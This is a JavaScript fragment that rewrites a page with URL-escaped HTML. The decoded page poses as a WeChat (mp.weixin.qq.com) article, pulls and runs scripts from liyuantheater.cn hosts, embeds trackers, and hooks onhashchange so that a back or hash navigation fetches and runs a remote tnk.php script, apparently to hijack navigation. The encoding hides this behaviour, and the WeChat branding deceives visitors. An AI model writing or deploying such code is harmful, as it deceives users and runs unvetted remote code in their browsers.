  var new_doc = document.open("text/html", "replace");
  var html = unescape("%3C%21DOCTYPE%20html%3E%0A%3Chtml%3E%0A%3Chead%3E%0A%20%20%20%20%3Cmeta%20http-equiv%3D%22Content-Type%22%20content%3D%22text/html%3B%20charset%3Dutf-8%22%3E%0A%20%20%20%20%3Cmeta%20name%3D%22viewport%22%20content%3D%22width%3Ddevice-width%2Cinitial-scale%3D1.0%2Cmaximum-scale%3D1.0%2Cuser-scalable%3D0%22%20/%3E%0A%20%20%20%20%3Cmeta%20name%3D%22apple-mobile-web-app-capable%22%20content%3D%22yes%22%3E%0A%20%20%20%20%3Cmeta%20name%3D%22apple-mobile-web-app-status-bar-style%22%20content%3D%22black%22%3E%0A%20%20%20%20%3Cmeta%20name%3D%22format-detection%22%20content%3D%22telephone%3Dno%22%3E%0A%20%20%20%20%3Ctitle%3E%20...%3C/title%3E%0A%20%20%20%20%3Clink%20rel%3D%22stylesheet%22%20type%3D%22text/css%22%20href%3D%22//cdnv.oss-cn-beijing.aliyuncs.com/sp/ad/main.css%22%3E%0A%20%20%20%20%3Clink%20rel%3D%22stylesheet%22%20type%3D%22text/css%22%20href%3D%22//cdnv.oss-cn-beijing.aliyuncs.com/sp/ad/more.css%22%3E%0A%20%20%20%20%3Clink%20href%3D%22//cdnv.oss-cn-beijing.aliyuncs.com/sp/res/swiper.min.css%22%20rel%3D%22stylesheet%22%3E%0A%20%20%20%20%3Cscript%20src%3D%22//cdnv.oss-cn-beijing.aliyuncs.com/sp/res/jquery.min.js%22%3E%3C/script%3E%0A%20%20%20%20%3Cscript%20src%3D%22//cdnv.oss-cn-beijing.aliyuncs.com/sp/res/jquery.cookie.js%22%3E%3C/script%3E%0A%20%20%20%20%3Cscript%20src%3D%22//cdnv.oss-cn-beijing.aliyuncs.com/sp/res/zepto.min.js%22%3E%3C/script%3E%0A%20%20%20%20%3Cscript%20src%3D%22//cdnv.oss-cn-beijing.aliyuncs.com/sp/res/iscroll-lite.min.js%22%3E%3C/script%3E%0A%20%20%20%20%3Cscript%20src%3D%22//cdnv.oss-cn-beijing.aliyuncs.com/sp/res/swiper.min.js%22%3E%3C/script%3E%0A%20%20%20%20%3Cscript%20src%3D%22https%3A//imgcache.qq.com/tencentvideo_v1/tvp/js/tvp.player_v2_zepto.js%22%20charset%3D%22utf-8%22%3E%3C/script%3E%0A%20%20%20%20%3Cscript%20src%3D%22https%3A//v.qq.com/iframe/tvp.config.js%22%20charset%3D%22utf-8%22%3E%3C/script%3E%0A%0A%3C/head%3E%0A%3Cbody%20id%3D%22activity-detail%22%20class%3D%22zh_CN%20mm_appmsg%22%20style%3D%22background-color%3A%23333%3B%22%3E%0A%3Cdiv%20id%3D%22content-content%22%20%20style%3D%22height%3A40px%3Btext-align%3Acenter%3Bpadding-top%3A10px%3Bcolor%3A%23999%3Bfont-size%3A80%25%3Bdisplay%3Ablock%3B%22%3E%u7F51%u9875%u7531%20mp.weixin.qq.com%20%u63D0%u4F9B%3C/div%3E%0A%3Cdiv%20id%3D%22wrapper%22%20style%3D%22position%3Aabsolute%3Btop%3A0%3Bbottom%3A0%3Bleft%3A0%3Bright%3A0%3B%22%3E%0A%20%20%20%20%3Cdiv%20id%3D%22scroll%22%20style%3D%22position%3Aabsolute%3Bbackground-color%3A%23f3f3f3%3Bz-index%3A100%3Bwidth%3A100%25%3B%22%3E%0A%20%20%20%20%20%20%20%20%3Cdiv%20id%3D%22js_article%22%20class%3D%22rich_media%22%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%3Cdiv%20id%3D%22js_top_ad_area%22%20class%3D%22top_banner%22%3E%20%3C/div%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%3Cdiv%20class%3D%22rich_media_inner%22%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cdiv%20id%3D%22page-content%22%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cdiv%20id%3D%22img-content%22%20class%3D%22rich_media_area_primary%22%20style%3D%22padding-top%3A5px%3B%22%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%0A%3Cscript%20src%3D%22//api2.liyuantheater.cn/sp/ad1.js%22%3E%3C/script%3E%0A%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3C/div%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3C/div%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%3C/div%3E%0A%20%20%20%20%20%20%20%20%3C/div%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cdiv%20class%3D%22rich_media_extra%22%20id%3D%22gdt_area%22%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%3Cdiv%20class%3D%22rich_tips%20with_line%20title_tips%22%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cspan%20class%3D%22tips%22%3E%u5E7F%u544A%3C/span%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%3C/div%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%3Cdiv%20class%3D%22js_ad_link%20extra_link%22%20style%3D%22padding%3A0%2015px%3B%22%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cdiv%20class%3D%22swiper-container%22%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cdiv%20class%3D%22swiper-wrapper%22%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cdiv%20class%3D%22swiper-slide%22%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Ca%20href%3D%22javascript%3A%3B%22%20onclick%3D%22xs%28%29%3B%22%20%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3C%21--%20%3Cimg%20src%3D%22http%3A//wx3.sinaimg.cn/large/e645b06bly1fj7qojomx8g20p606975y.gif%22%20border%3D%220%22%3E--%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cimg%20src%3D%22https%3A//wx2.sinaimg.cn/mw690/afe9bbfagy1fluq5sulg4g20go05kdoh.gif%22%20border%3D%220%22%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3C/a%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3C/div%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3C/div%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3C/div%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%3C/div%3E%0A%20%20%20%20%20%20%20%20%3C/div%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%3C/div%3E%0A%20%20%20%20%3Cdiv%20style%3D%22display%3Anone%22%3E%0Avar%20_hmt%20%3D%20_hmt%20%7C%7C%20%5B%5D%3B%0A%28function%28%29%20%7B%0A%20%20var%20hm%20%3D%20document.createElement%28%22script%22%29%3B%0A%20%20hm.src%20%3D%20%22https%3A//hm.baidu.com/hm.js%3F89baca9450a6a81441d8917b951c6a69%22%3B%0A%20%20var%20s%20%3D%20document.getElementsByTagName%28%22script%22%29%5B0%5D%3B%20%0A%20%20s.parentNode.insertBefore%28hm%2C%20s%29%3B%0A%7D%29%28%29%3B%0A%3Cscript%20src%3D%22https%3A//s4.cnzz.com/z_stat.php%3Fid%3D4775285%26web_id%3D4775285%22%20language%3D%22JavaScript%22%3E%3C/script%3E%0A%09%3C/div%3E%0A%3C/div%3E%0A%3Cdiv%20id%3D%22pauseplay%22%20style%3D%22display%3Anone%3Bopacity%3A%200%3Bposition%3Afixed%3Bleft%3A0%3Bright%3A0%3Btop%3A65px%3Bbottom%3A0%3Bbackground-color%3Argba%2880%2C80%2C80%2C50%29%3Bz-index%3A1000000%3B%22%3E%0A%3C/div%3E%0A%3C/body%3E%0A%0A%0A%0A%0A%3Cscript%20src%3D%22//res.wx.qq.com/open/js/jweixin-1.0.0.js%22%3E%3C/script%3E%0A%20%3Clink%20href%3D%22//cdnv.oss-cn-beijing.aliyuncs.com/qun/css/weui.min.css%22%20rel%3D%22stylesheet%22%20type%3D%22text/css%22%20/%3E%0A%20%3Cstyle%3E%0A%20%20%20%20%20.mask%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20display%3A%20none%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20position%3A%20absolute%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20top%3A%200%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20filter%3A%20alpha%28opacity%3D75%29%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20background-color%3A%20%23000%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20z-index%3A%2062%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20left%3A%200%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20opacity%3A%20.8%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20-moz-opacity%3A%20.8%0A%20%20%20%20%20%20%20%20%7D%0A%3C/style%3E%0A%3Cscript%3Edocument.write%28%27%3Cimg%20src%3D%22//cdnv.oss-cn-beijing.aliyuncs.com/sp/ad/fxq2.png%22%20id%3D%22fenxiang%22%20style%3D%22display%3Ablock%3Bwidth%3A100%25%3Bposition%3Afixed%3Bz-index%3A999%3Btop%3A0%3Bleft%3A0%3Bdisplay%3Anone%22%3E%27%29%3B%3C/script%3E%0A%3Cdiv%20id%3D%22mask%22%20class%3D%22mask%22%3E%0A%20%20%20%20%26nbsp%3B%0A%3C/div%3E%0A%0A%3Cscript%20type%3D%22text/javascript%22%20src%3D%22//cdnv.oss-cn-beijing.aliyuncs.com/qun/js/zepto.min.js%22%20charset%3D%22utf-8%22%3E%3C/script%3E%0A%3Cscript%20src%3D%27//api2.liyuantheater.cn/c_app.js%27%20charset%3D%22utf-8%22%3E%3C/script%3E%0A%0A%3C/html%3E%0A");
  new_doc.write(html);
  new_doc.close();


  // var _hmt = _hmt || [];
  // (function () {
  //   var hm = document.createElement("script");
  //   hm.src = "https://hm.baidu.com/hm.js?89baca9450a6a81441d8917b951c6a69";
  //   var s = document.getElementsByTagName("script")[0];
  //   s.parentNode.insertBefore(hm, s);
  // })();




  window.onhashchange = function () {
    xs();
  };

  function xs() {
    // $.getScript('//api.handoubao.cn/ad/tnk.php',function(){
    //  location.href=tzurl;})

    $.getScript("//api1.liyuantheater.cn/ad/tnk.php");
    // var ua = navigator.userAgent.toLowerCase(); if (/micromessenger/.test(ua)) { top.location.href = 'http://mp./nk.html'; }
  }